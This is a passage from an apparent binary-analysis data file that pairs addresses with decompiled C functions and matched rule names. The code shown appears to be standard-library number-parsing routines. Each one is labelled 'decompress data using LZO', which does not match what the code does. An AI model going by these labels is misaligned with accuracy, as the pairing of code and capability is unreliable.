0xffffffff;\n                    uVar1 = fcn.00430ce0(var_48h);\n                    if (uVar1 != 0) goto code_r0x0044ad6a;\n                    uVar7 = fcn.00430dd0();\n                } while( true );\n            }\n            uVar11 = 0;\n            var_32h = 0;\n            uVar12 = 0;\n            goto code_r0x0044ad6a;\n        }\ncode_r0x0044ae93:\n        uVar1 = var_32h;\n        var_50h = uVar14 >> 0x20;\n        var_4ch = uVar14;\n        var_48h = &arg_10h;\n        if (var_32h != 0) {\n            uVar11 = 0;\n            uVar12 = 0;\n            var_33h = 0;\n            var_32h = 0;\n            goto code_r0x0044ad6a;\n        }\n        var_33h = 0;\n        uVar11 = 0;\n        uVar12 = 0;\n        uVar2 = *(iVar5 + 0x10);\n        if ((uVar2 != 0) && (*(iVar5 + 0x25) == uVar7)) goto code_r0x0044af9e;\ncode_r0x0044aec2:\n        if ((uVar7 != *(iVar5 + 0x24)) && (iVar8 = sub.msvcrt.dll_memchr(iVar5 + 0x4e, uVar7, var_44h),  iVar8 != 0)) {\n            uVar6 = iVar8 - (iVar5 + 0x4e);\n            if (0xf < uVar6) {\n                uVar6 = uVar6 - 6;\n            }\n            if (var_50h < uVar12 || var_50h - uVar12 < (var_4ch < uVar11)) {\n                var_33h = 1;\n            }\n            else {\n                uVar7 = uVar11 * var_40h;\n                uVar12 = (uVar11 * var_40h >> 0x20) + var_40h * uVar12;\n                uVar11 = (var_54h - (uVar6 >> 0x1f)) - (var_58h < uVar6);\n                var_33h = var_33h | (uVar11 < uVar12 || uVar11 - uVar12 < (var_58h - uVar6 < uVar7));\n                uVar11 = uVar7 + uVar6;\n                uVar12 = uVar12 + (uVar6 >> 0x1f) + CARRY4(uVar7, uVar6);\n                var_38h = var_38h + 1;\n            }\n            uVar6 = arg_8h[2];\n            if (arg_8h[3] <= uVar6) goto code_r0x0044afcc;\n            do {\n                arg_8h[2] = uVar6 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    uVar1 = fcn.00430ce0(var_48h);\n                    if (uVar1 != 0) goto code_r0x0044ad6a;\n                    uVar7 = fcn.00430dd0();\n                    uVar2 = *(iVar5 + 0x10);\n                    if ((uVar2 == 0) || (*(iVar5 + 0x25) != uVar7)) goto code_r0x0044aec2;\ncode_r0x0044af9e:\n                    if (var_38h == 0) {\n                        uVar1 = 0;\n                        var_32h = uVar2;\n                        goto code_r0x0044ad6a;\n                    }\n                    fcn.0046d560(var_38h);\n                    var_38h = 0;\n                    uVar6 = arg_8h[2];\n                    if (uVar6 < arg_8h[3]) break;\ncode_r0x0044afcc:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x0044b190:\n        uVar1 = 0;\n        uVar2 = 0;\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x0044b1a0;\ncode_r0x0044ad78:\n        if ((var_38h != 0) || (var_31h == 1)) {\ncode_r0x0044b1f1:\n            if (var_32h == 0) {\n                if (var_33h == 0) {\n                    if (bVar13) {\n                        bVar13 = uVar11 != 0;\n                        uVar11 = -uVar11;\n                        uVar12 = -(uVar12 + bVar13);\n                    }\n                    *arg_20h = uVar11;\n                    arg_20h[1] = uVar12;\n                }\n                else {\n                    uVar6 = 0;\n                    uVar7 = 0x80000000;\n                    if (!bVar13) {\n                        uVar6 = 0xffffffff;\n                        uVar7 = 0x7fffffff;\n                    }\n                    *arg_20h = uVar6;\n                    arg_20h[1] = uVar7;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x0044ada6;\n            }\n        }\n    }\n    else {\n        var_40h = 10;\n        if (uVar6 != 8) goto code_r0x0044ab5f;\n        var_40h = 0x10;\n        uVar1 = fcn.00430ce0(&arg_10h);\n        if (uVar1 == 0) goto code_r0x0044ab7e;\n        *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n        uVar2 = *(iVar5 + 0x10);\n        if (uVar2 != 0) {\n            var_38h = 0;\n            uVar7 = 0;\n            var_31h = false;\n            bVar13 = false;\n            var_44h = 0x16;\n            var_40h = 0x10;\n            var_32h = uVar2;\n            goto code_r0x0044b310;\n        }\n        var_32h = *(iVar5 + 100);\n        bVar13 = false;\n        if (var_32h != 0) {\n            var_44h = 0x16;\n            uVar7 = 0;\n            uVar14 = 0x7ffffffffffffff;\n            var_58h = 0xffffffff;\n            var_54h = 0x7fffffff;\n            var_38h = 0;\n            var_40h = 0x10;\n            var_31h = uVar2;\n            goto code_r0x0044ae93;\n        }\n        uVar11 = 0;\n        uVar12 = 0;\n        var_33h = 0;\n        var_38h = 0;\n        var_31h = var_32h;\ncode_r0x0044ad6a:\n        uVar2 = uVar1;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0044ad78;\ncode_r0x0044b1a0:\n        uVar1 = uVar2;\n        fcn.0046d560(var_38h);\n        cVar4 = fcn.0049e880(*(iVar5 + 8), *(iVar5 + 0xc), &var_1eh + 2);\n        if (cVar4 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_38h != 0) || (var_31h == 1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0044b1f1;\n    }\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0044ada6:\n    var_60h = &var_1eh + 1;\n    if (uVar1 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(var_60h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4591
    },
    "0044b450": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044b450(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint8_t var_3eh;\n    int32_t var_3dh;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar10 = arg_18h;\n    iVar6 = fcn.0042e410(arg_18h + 0x6c);\n    uVar7 = *(iVar10 + 0xc) & 0x4a;\n    if (uVar7 == 0x40) {\n        uVar13 = 8;\ncode_r0x0044b48f:\n        var_3dh._0_1_ = fcn.00430ce0(&arg_10h);\n        if (var_3dh == '\\0') {\ncode_r0x0044b4ae:\n            var_50h = &arg_10h;\n            uVar8 = fcn.00430dd0();\n            cVar5 = uVar8;\n            bVar15 = *(iVar6 + 0x4a) == cVar5;\n            cVar3 = *(iVar6 + 0x10);\n            if ((((bVar15) || (*(iVar6 + 0x4b) == cVar5)) && ((cVar3 == '\\0' || (*(iVar6 + 0x25) != cVar5)))) &&\n               (*(iVar6 + 0x24) != cVar5)) {\n                fcn.00485e80();\n                arg_ch = 0xffffffff;\n                var_3dh._0_1_ = fcn.00430ce0(var_50h);\n                stack0xffffffc0 = 0;\n                bVar14 = false;\n                if (var_3dh == '\\0') {\n                    uVar8 = fcn.00430dd0();\n                    cVar3 = *(iVar6 + 0x10);\n                    goto code_r0x0044b700;\n                }\n            }\n            else {\ncode_r0x0044b700:\n                stack0xffffffc0 = 0;\n                bVar14 = false;\n                while (((cVar5 = uVar8,  cVar3 == '\\0' || (*(iVar6 + 0x25) != cVar5)) && (*(iVar6 + 0x24) != cVar5))) {\n                    if (*(iVar6 + 0x4e) == cVar5) {\n                        bVar4 = uVar13 == 10 | bVar14 ^ 1U;\n                        if (!bVar4) goto code_r0x0044b749;\n                        bVar14 = uVar7 == 0 || uVar13 == 8;\n                        if (uVar7 != 0 && uVar13 != 8) {\n                            unique0x00007a80 = stack0xffffffc0 + 1;\n                            goto code_r0x0044b77d;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar13 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x0044b880;\ncode_r0x0044b78c:\n                        arg_8h[2] = uVar9 + 1;\ncode_r0x0044b799:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar10 = (**(*arg_8h + 0x24))(),  iVar10 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar14) break;\ncode_r0x0044b749:\n                        if ((*(iVar6 + 0x4c) != cVar5) && (*(iVar6 + 0x4d) != cVar5)) {\n                            var_3dh._0_1_ = '\\0';\n                            bVar14 = true;\n                            goto code_r0x0044b520;\n                        }\n                        var_3dh._0_1_ = uVar13 == 0x10 || uVar7 == 0;\n                        if (uVar13 != 0x10 && uVar7 != 0) {\n                            bVar14 = true;\n                            goto code_r0x0044b52c;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar13 = 0x10;\n                        bVar4 = false;\ncode_r0x0044b77d:\n                        uVar9 = arg_8h[2];\n                        bVar14 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x0044b78c;\ncode_r0x0044b880:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044b799;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar4 = arg_10h != NULL && arg_14h == -1;\n                    var_4ch._0_1_ = arg_14h == -1;\n                    if ((bVar4) && (var_4ch._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar10 = (**(*arg_10h + 0x24))();\n                        var_4ch._0_1_ = false;\n                        if (iVar10 == -1) {\n                            arg_10h = NULL;\n                            var_4ch._0_1_ = bVar4;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_4ch) {\n                        var_3dh._0_1_ = '\\x01';\n                        goto code_r0x0044b520;\n                    }\n                    uVar8 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                            if (uVar8 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar8 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar14) break;\n                    cVar3 = *(iVar6 + 0x10);\n                }\n                var_3dh._0_1_ = '\\0';\n            }\ncode_r0x0044b520:\n            var_4ch = 0x16;\n            if (uVar13 == 0x10) goto code_r0x0044b52f;\n        }\n        else {\n            uVar8 = 0;\n            stack0xffffffc0 = 0;\n            bVar14 = false;\n            bVar15 = false;\n        }\ncode_r0x0044b52c:\n        var_4ch = uVar13;\n    }\n    else {\n        uVar13 = 10;\n        if (uVar7 != 8) goto code_r0x0044b48f;\n        uVar13 = 0x10;\n        var_3dh._0_1_ = fcn.00430ce0(&arg_10h);\n        if (var_3dh == '\\0') goto code_r0x0044b4ae;\n        uVar8 = 0;\n        stack0xffffffc0 = 0;\n        uVar13 = 0x10;\n        bVar14 = false;\n        bVar15 = false;\n        var_4ch = 0x16;\n    }\ncode_r0x0044b52f:\n    cVar3 = var_3dh;\n    var_50h = &arg_10h;\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar16 = fcn.00418980(0xffffffff, 0xffffffff, uVar13, 0);\n    uVar7 = uVar16 >> 0x20;\n    uVar1 = *(iVar6 + 100);\n    if (uVar1 == 0) {\n        var_3eh = 0;\n        if (var_3dh == '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            do {\n                cVar3 = uVar8;\n                iVar10 = cVar3;\n                if (var_4ch < 0xb) {\n                    if ((cVar3 < '0') || (var_4ch + '0' <= cVar3)) goto code_r0x0044b8f2;\ncode_r0x0044b5e0:\n                    uVar8 = iVar10 - 0x30;\n                }\n                else {\n                    if (cVar3 - 0x30U < 10) goto code_r0x0044b5e0;\n                    if (cVar3 + 0x9fU < 6) {\n                        uVar8 = iVar10 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar3 + 0xbfU) goto code_r0x0044b8f2;\n                        uVar8 = iVar10 - 0x37;\n                    }\n                }\n                if (uVar8 == 0xffffffff) goto code_r0x0044b8f2;\n                if (uVar7 < var_34h || uVar7 - var_34h < (uVar16 < var_38h)) {\n                    var_3eh = 1;\n                    uVar8 = arg_8h[2];\n                    if (arg_8h[3] <= uVar8) goto code_r0x0044b9a3;\ncode_r0x0044b64e:\n                    arg_8h[2] = uVar8 + 1;\n                }\n                else {\n                    uVar9 = var_38h * uVar13;\n                    uVar12 = (var_38h * uVar13 >> 0x20) + uVar13 * var_34h;\n                    uVar11 = ~(uVar8 >> 0x1f);\n                    var_3eh = var_3eh | (uVar11 < uVar12 || uVar11 - uVar12 < (~uVar8 < uVar9));\n                    var_38h = uVar8 + uVar9;\n                    var_34h = (uVar8 >> 0x1f) + uVar12 + CARRY4(uVar8, uVar9);\n                    uVar8 = arg_8h[2];\n                    unique0x00007a80 = stack0xffffffc0 + 1;\n                    if (uVar8 < arg_8h[3]) goto code_r0x0044b64e;\ncode_r0x0044b9a3:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar3 = fcn.00430ce0(var_50h);\n                if (cVar3 != '\\0') goto code_r0x0044b676;\n                uVar8 = fcn.00430dd0();\n            } while( true );\n        }\n        var_38h = 0;\n        var_3dh._0_1_ = '\\0';\n        var_34h = 0;\ncode_r0x0044b676:\n        cVar5 = cVar3;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0044b684;\ncode_r0x0044b902:\n        cVar3 = cVar5;\n        fcn.0046d560(var_3dh._1_1_);\n        cVar5 = fcn.0049e880(*(iVar6 + 8), *(iVar6 + 0xc), &var_1eh + 2);\n        if (cVar5 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((stack0xffffffc0 != 0) || (bVar14)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0044b950;\n    }\n    else {\n        if (var_3dh != '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            var_3eh = 0;\n            var_3dh._0_1_ = '\\0';\n            goto code_r0x0044b676;\n        }\n        var_3eh = 0;\n        cVar5 = *(iVar6 + 0x10);\n        var_38h = 0;\n        var_34h = 0;\n        if ((cVar5 != '\\0') && (*(iVar6 + 0x25) == uVar8)) goto code_r0x0044bb5d;\ncode_r0x0044ba75:\n        if ((uVar8 != *(iVar6 + 0x24)) && (iVar10 = sub.msvcrt.dll_memchr(iVar6 + 0x4e, uVar8, var_4ch),  iVar10 != 0))\n        {\n            uVar8 = iVar10 - (iVar6 + 0x4e);\n            if (0xf < uVar8) {\n                uVar8 = uVar8 - 6;\n            }\n            uVar2 = uVar1;\n            if (var_34h <= uVar7 && (uVar16 < var_38h) <= uVar7 - var_34h) {\n                uVar9 = var_38h * uVar13;\n                uVar12 = uVar13 * var_34h + (var_38h * uVar13 >> 0x20);\n                uVar11 = ~(uVar8 >> 0x1f);\n                var_38h = uVar8 + uVar9;\n                var_34h = (uVar8 >> 0x1f) + uVar12 + CARRY4(uVar8, uVar9);\n                unique0x00007a80 = stack0xffffffc0 + 1;\n                uVar2 = var_3eh | (uVar11 < uVar12 || uVar11 - uVar12 < (~uVar8 < uVar9));\n            }\n            var_3eh = uVar2;\n            uVar8 = arg_8h[2];\n            if (arg_8h[3] <= uVar8) goto code_r0x0044bb8d;\n            do {\n                arg_8h[2] = uVar8 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar3 = fcn.00430ce0(var_50h);\n                    if (cVar3 != '\\0') goto code_r0x0044b676;\n                    uVar8 = fcn.00430dd0();\n                    cVar5 = *(iVar6 + 0x10);\n                    if ((cVar5 == '\\0') || (*(iVar6 + 0x25) != uVar8)) goto code_r0x0044ba75;\ncode_r0x0044bb5d:\n                    if (stack0xffffffc0 == 0) {\n                        cVar3 = '\\0';\n                        var_3dh._0_1_ = cVar5;\n                        goto code_r0x0044b676;\n                    }\n                    fcn.0046d560(stack0xffffffc0);\n                    stack0xffffffc0 = 0;\n                    uVar8 = arg_8h[2];\n                    if (uVar8 < arg_8h[3]) break;\ncode_r0x0044bb8d:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x0044b8f2:\n        cVar3 = '\\0';\n        cVar5 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x0044b902;\ncode_r0x0044b684:\n        if ((stack0xffffffc0 != 0) || (bVar14)) {\ncode_r0x0044b950:\n            if (var_3dh == '\\0') {\n                if (var_3eh == 0) {\n                    if (bVar15) {\n                        bVar14 = var_38h != 0;\n                        var_38h = -var_38h;\n                        var_34h = -(var_34h + bVar14);\n                    }\n                    *arg_20h = var_38h;\n                    arg_20h[1] = var_34h;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    arg_20h[1] = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x0044b6b2;\n            }\n        }\n    }\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0044b6b2:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4145
    },
    "0044bd00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044bd00(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t arg_18h, uint *arg_1ch, int32_t *arg_20h\n            )\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint s;\n    int32_t var_38h;\n    uint var_31h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar4 = fcn.0042e410(arg_18h + 0x6c);\n    var_31h._0_1_ = fcn.00430ce0(&arg_10h);\n    if (var_31h == 0) {\n        cVar3 = fcn.00430dd0();\n        cVar2 = *(iVar4 + 0x10);\n        if ((((*(iVar4 + 0x4b) == cVar3) || (*(iVar4 + 0x4a) == cVar3)) &&\n            ((cVar2 == '\\0' || (*(iVar4 + 0x25) != cVar3)))) && (*(iVar4 + 0x24) != cVar3)) {\n            fcn.0046d560((*(iVar4 + 0x4b) != cVar3) * '\\x02' + '+');\n            fcn.00485e80();\n            arg_ch = 0xffffffff;\n            var_31h._0_1_ = fcn.00430ce0(&arg_10h);\n            var_38h = 0;\n            uVar10 = 0;\n            if (var_31h != 0) goto code_r0x0044bd50;\n            cVar3 = fcn.00430dd0();\n            cVar2 = *(iVar4 + 0x10);\n        }\n        uVar10 = 0;\n        var_38h = 0;\n        while ((((cVar2 == '\\0' || (*(iVar4 + 0x25) != cVar3)) && (*(iVar4 + 0x24) != cVar3)) &&\n               (*(iVar4 + 0x4e) == cVar3))) {\n            if (uVar10 == 0) {\n                fcn.0046d560(0x30);\n                uVar6 = arg_8h[2];\n                if (uVar6 < arg_8h[3]) goto code_r0x0044c2b1;\ncode_r0x0044c300:\n                (**(*arg_8h + 0x28))();\n            }\n            else {\n                uVar6 = arg_8h[2];\n                if (arg_8h[3] <= uVar6) goto code_r0x0044c300;\ncode_r0x0044c2b1:\n                arg_8h[2] = uVar6 + 1;\n            }\n            var_38h = var_38h + 1;\n            arg_ch = 0xffffffff;\n            var_31h._0_1_ = fcn.00430ce0(&arg_10h);\n            uVar10 = var_31h;\n            if (var_31h != 0) goto code_r0x0044bd50;\n            cVar3 = fcn.00430dd0();\n            cVar2 = *(iVar4 + 0x10);\n            uVar10 = 1;\n        }\n        var_31h._0_1_ = 0;\n    }\n    else {\n        cVar3 = '\\0';\n        var_38h = 0;\n        uVar10 = 0;\n    }\ncode_r0x0044bd50:\n    *NULL = fcn.0046ba90(0, 0, &var_1eh + 1);\n    if (*(iVar4 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    uVar11 = *(iVar4 + 100);\n    if (uVar11 == 0) {\n        if (var_31h == 0) {\n            uVar1 = 0;\ncode_r0x0044bebf:\n            if (9 < cVar3 - 0x30U) goto code_r0x0044bf40;\ncode_r0x0044beca:\n            if (cVar3 + -0x30 == -1) goto code_r0x0044bf40;\n            fcn.0046d560(cVar3 + -0x30 + '0');\n            uVar11 = 1;\ncode_r0x0044beeb:\n            uVar6 = arg_8h[2];\n            uVar10 = uVar1;\n            if (arg_8h[3] <= uVar6) goto code_r0x0044bff7;\n            do {\n                arg_8h[2] = uVar6 + 1;\n                uVar1 = uVar10;\n                uVar10 = uVar11;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar2 = fcn.00430ce0(&arg_10h);\n                    if (cVar2 != '\\0') goto code_r0x0044be2c;\n                    cVar3 = fcn.00430dd0();\n                    if (cVar3 - 0x30U < 10) goto code_r0x0044beca;\ncode_r0x0044bf40:\n                    if ((*(iVar4 + 0x24) == cVar3) && ((var_31h | uVar1) == 0)) {\n                        fcn.0046d560(0x2e);\n                        uVar1 = 0;\n                        var_31h._0_1_ = 1;\n                        uVar11 = uVar10;\n                        goto code_r0x0044beeb;\n                    }\n                    if (((*(iVar4 + 0x5c) != cVar3) && (*(iVar4 + 0x62) != cVar3)) ||\n                       (uVar10 = uVar10 & (uVar1 ^ 1),  uVar10 == 0)) goto code_r0x0044be2c;\n                    fcn.0046d560(0x65);\n                    if (arg_8h[2] < arg_8h[3]) {\n                        arg_8h[2] = arg_8h[2] + 1;\n                    }\n                    else {\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 0xffffffff;\n                    cVar2 = fcn.00430ce0(&arg_10h);\n                    if (cVar2 != '\\0') goto code_r0x0044c3d0;\n                    cVar3 = fcn.00430dd0();\n                    if (*(iVar4 + 0x4b) == cVar3) {\n                        uVar7 = 0x2b;\n                    }\n                    else {\n                        uVar1 = uVar10;\n                        if (*(iVar4 + 0x4a) != cVar3) goto code_r0x0044bebf;\n                        uVar7 = 0x2d;\n                    }\n                    fcn.0046d560(uVar7);\n                    uVar6 = arg_8h[2];\n                    uVar11 = uVar10;\n                    if (uVar6 < arg_8h[3]) break;\ncode_r0x0044bff7:\n                    (**(*arg_8h + 0x28))();\n                    uVar1 = uVar10;\n                    uVar10 = uVar11;\n                }\n            } while( true );\n        }\n    }\n    else if (var_31h == 0) {\n        uVar9 = *(iVar4 + 0x10);\n        uVar1 = 0;\ncode_r0x0044bda0:\n        if ((uVar9 != 0) && (*(iVar4 + 0x25) == cVar3)) {\n            var_31h._0_1_ = var_31h | uVar1;\n            if (var_31h == 0) {\n                if (var_38h != 0) {\n                    fcn.0046d560(var_38h);\n                    uVar8 = 0;\n                    var_38h = 0;\n                    goto code_r0x0044bdf7;\n                }\n                fcn.0046d3b0(0, *(*arg_20h + -0xc), 0);\n                iVar5 = *(stack0xffffffe0 + -0xc);\n                goto joined_r0x0044c406;\n            }\n            iVar5 = *(stack0xffffffe0 + -0xc);\n            goto joined_r0x0044c3f3;\n        }\n        if (*(iVar4 + 0x24) == cVar3) {\n            uVar8 = uVar1 | var_31h;\n            iVar5 = *(stack0xffffffe0 + -0xc);\n            if (uVar8 == 0) {\n                if (iVar5 != 0) {\n                    fcn.0046d560(var_38h);\n                }\n                fcn.0046d560(0x2e);\n                uVar6 = arg_8h[2];\n                var_31h._0_1_ = uVar11;\n                if (arg_8h[3] <= uVar6) goto code_r0x0044c061;\n                goto code_r0x0044be06;\n            }\n            goto joined_r0x0044c3f3;\n        }\n        iVar5 = sub.msvcrt.dll_memchr(iVar4 + 0x4e, cVar3, 10);\n        if (iVar5 != 0) {\n            fcn.0046d560((iVar5 - (iVar4 + 0x4e)) + '0');\n            var_38h = var_38h + 1;\n            uVar8 = uVar1;\n            uVar10 = uVar11;\n            goto code_r0x0044bdf7;\n        }\n        if ((*(iVar4 + 0x5c) != cVar3) && (*(iVar4 + 0x62) != cVar3)) goto code_r0x0044be2c;\n        iVar5 = *(stack0xffffffe0 + -0xc);\n        uVar8 = uVar10 & (uVar1 ^ 1);\n        if (uVar8 == 0) goto code_r0x0044be32;\n        if ((iVar5 != 0) && (var_31h == 0)) {\n            fcn.0046d560(var_38h);\n        }\n        fcn.0046d560(0x65);\n        fcn.00485e80();\n        arg_ch = 0xffffffff;\n        cVar2 = fcn.00430ce0(&arg_10h);\n        if (cVar2 == '\\0') goto code_r0x0044c0ff;\ncode_r0x0044c3d0:\n        arg_ch = 0xffffffff;\n        iVar5 = *(stack0xffffffe0 + -0xc);\njoined_r0x0044c3f3:\n        if (iVar5 == 0) goto code_r0x0044be84;\n        goto code_r0x0044be61;\n    }\n    iVar5 = *(stack0xffffffe0 + -0xc);\njoined_r0x0044c406:\n    if (iVar5 == 0) goto code_r0x0044be84;\ncode_r0x0044be4a:\n    fcn.0046d560(var_38h);\n    goto code_r0x0044be61;\ncode_r0x0044c0ff:\n    cVar3 = fcn.00430dd0();\n    uVar9 = *(iVar4 + 0x10);\n    if ((((*(iVar4 + 0x4b) == cVar3) || (uVar1 = uVar8,  uVar10 = uVar8,  *(iVar4 + 0x4a) == cVar3)) &&\n        ((uVar9 == 0 || (uVar1 = uVar9,  uVar10 = uVar9,  *(iVar4 + 0x25) != cVar3)))) &&\n       (uVar1 = uVar8,  uVar10 = uVar8,  *(iVar4 + 0x24) != cVar3)) {\n        fcn.0046d560((*(iVar4 + 0x4b) != cVar3) * '\\x02' + '+');\ncode_r0x0044bdf7:\n        uVar6 = arg_8h[2];\n        if (uVar6 < arg_8h[3]) {\ncode_r0x0044be06:\n            arg_8h[2] = uVar6 + 1;\n            uVar1 = uVar8;\n        }\n        else {\ncode_r0x0044c061:\n            (**(*arg_8h + 0x28))();\n            uVar1 = uVar8;\n        }\n        arg_ch = 0xffffffff;\n        cVar2 = fcn.00430ce0(&arg_10h);\n        if (cVar2 != '\\0') goto code_r0x0044be2c;\n        cVar3 = fcn.00430dd0();\n        uVar9 = *(iVar4 + 0x10);\n    }\n    goto code_r0x0044bda0;\ncode_r0x0044be2c:\n    iVar5 = *(stack0xffffffe0 + -0xc);\ncode_r0x0044be32:\n    if (iVar5 == 0) goto code_r0x0044be84;\n    if ((var_31h == 0) && (uVar1 == 0)) goto code_r0x0044be4a;\ncode_r0x0044be61:\n    cVar2 = fcn.0049e880(*(iVar4 + 8), *(iVar4 + 0xc), &var_1eh + 2);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\ncode_r0x0044be84:\n    fcn.0046bf80(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 3252
    },
    "0044ca00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.0044ca00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *arg_1ch_00;\n    char cVar3;\n    ulong uVar4;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    arg_1ch_00 = arg_1ch;\n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    fcn.0046d280(0x20);\n    uVar4 = fcn.0044bd00(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch_00, &var_20h);\n    var_1ch = fcn.0048f260();\n    fcn.0049dc10(var_20h, arg_20h, arg_1ch_00, &var_1ch);\n    cVar3 = fcn.00430ce0(&arg_10h);\n    if (cVar3 != '\\0') {\n        *arg_1ch_00 = *arg_1ch_00 | 2;\n    }\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + -4;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4;\n    }\n    fcn.0046bf60(&var_1ch);\n    return uVar4;\n}\n",
        "token_count": 471
    },
    "0044cb30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
